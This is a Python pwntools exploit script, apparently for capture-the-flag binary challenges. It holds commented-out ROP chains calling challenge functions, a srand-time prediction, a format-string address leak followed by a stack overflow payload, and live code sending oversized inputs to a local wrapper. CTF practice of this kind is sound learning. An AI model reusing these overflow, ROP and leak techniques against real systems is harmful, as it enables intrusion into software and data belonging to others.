from pwn import *
import ctypes
import time
import re

# def extract_hex_value(text_string):
#     match = re.search(r'0x[0-9a-fA-F]+', text_string)
#     if match:
#         return int(match.group(0), 16)
#     else:
#         return None

# libc_rand = ctypes.CDLL(None)

# def predict_nhonks(timestamp):
#     libc_rand.srand(timestamp)
#     first_rand = libc_rand.rand()
#     nhonks = (first_rand % 91) + 10
#     return nhonks

context.terminal =  ["tmux", "splitw", "-h"] 
context.endian = 'little'
BINARY = "./chall"
HOST = "34.45.81.67"
PORT = 16004

elf = ELF(BINARY)

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

rop = ROP(elf)
libc = elf.libc
rop_libc = ROP(libc)
# for i, gadget in enumerate(rop.gadgets):
#     # Print the gadget's address and its disassembled instructions
#     # The 'str(gadget)' method provides a nice formatted output.
#     print(f"[{i:03d}] {gadget}")
# log.info(f"libc_addr {hex(libc.symbols[""])}")
# start process
# 0x000055fc29938000
# 55fc2993bdd8
# POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
# RET = (rop.find_gadget(['ret']))[0]
# CAMP1 = elf.symbols['camp1']
# CAMP2 = elf.symbols['camp2']
# SUMMIT = elf.symbols['summit']
# MAIN = elf.symbols['main']
# POP_RSI = (rop.find_gadget(['pop rsi', 'ret']))[0]
# log.info("CAMP1 func: " + hex(CAMP1))
# log.info("CAMP2 func: " + hex(CAMP2))
# log.info("SUMMIT func: " + hex(SUMMIT))
# log.info("MAIN func: " + hex(MAIN))
# log.info("pop rdi gadget: " + hex(POP_RDI))
# log.info("pop rsi gadget: " + hex(POP_RSI))
# log.info("ret: " + hex(RET))

# run process until it encounters help?)


# payload = b"A"*56 # Overflows the stack by 48 then add 8 bytes for stack alignment
# payload += p64(RET) # jump return instruction because remote is weird
# payload += p64(CAMP1) # jump to the camp1 function
# payload += p64(RET) # jump to the camp1 function
# # payload += p64(MAIN)
# payload += p64(POP_RDI) # once camp1 returns jump to POP_RDI instruction
# payload += b"g" + b"A"*7 # camp2 requires register al to be the letter g so put that first and then pad by 7 bytes
# payload += p64(CAMP2) # jump to camp2 function
# payload += p64(POP_RDI) # need to jump back to another POP_RDI so the letter c is put in the lower rdi register
# payload += b"c" + b"A"*7 
# payload += p64(POP_RSI) # jump to a pop rsi instruction for the next if check in summit
# payload += b"tf" + b"A"*6
# payload += p64(SUMMIT) # jump to the summit function
# for i in range(100):

# POP_RDI = (rop_libc.find_gadget(['pop rdi', 'ret']))[0]
# RET = (rop_libc.find_gadget(['ret']))[0]
# log.info("pop rdi gadget: " + hex(POP_RDI))
# log.info("ret: " + hex(RET))

# def leak_main(p):
#     current_time = int(time.time())
#     predicted_value = f"{predict_nhonks(current_time)}"

#     p.recvuntil(b">")
#     p.sendline(b"hello")
#     p.sendlineafter(b"how many honks?", predicted_value.encode())
#     response = p.recv()
#     # print(i)
#     # "taaduaad"
#     # aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
#     # payload = cyclic(400)
#     # payload = b"A"*376
#     # print(payload)
#     payload_p1 = f"%61$p".encode()
#     if b"THE GOOSE WINS" not in response and b"tough luck" not in response:
#         print(response.decode())
#         p.sendline(payload_p1)
#         leak_resp = extract_hex_value(p.recv().decode())
#         print(leak_resp)
#         # print(p.recv().decode())

#         payload_p2 = b"A"*376
#         payload_p2 += p64(leak_resp)
#         # payload_p2 += f"{leak_resp}".encode()
#         # print(payload_p2)
#         p.sendline(payload_p2)
#         print(p.recv())
#     return p

# p = start_binary()
p = process(["python3", "wrapper.py"])

# Step 1: Send 255-byte first line (no newline in last char)
p.recv()
payload_part1 = b"A" * 255
p.sendline(payload_part1)
payload_part2 = b"B" * 400
p.sendline(payload_part2 + b'\x0F')
# p.stdin.close()
# if not args.REMOTE and args.GDB:
#     gdb.attach(p, """
#     b* highscore+198
#     b* highscore+286
#     c
#     """)

# MAIN = elf.symbols['main']
# log.info(f"main addr at: {hex(MAIN)}")
# p.sendline(b"A"*270)
# leak_main(p)
print(p.recv().decode())
# p.interactive()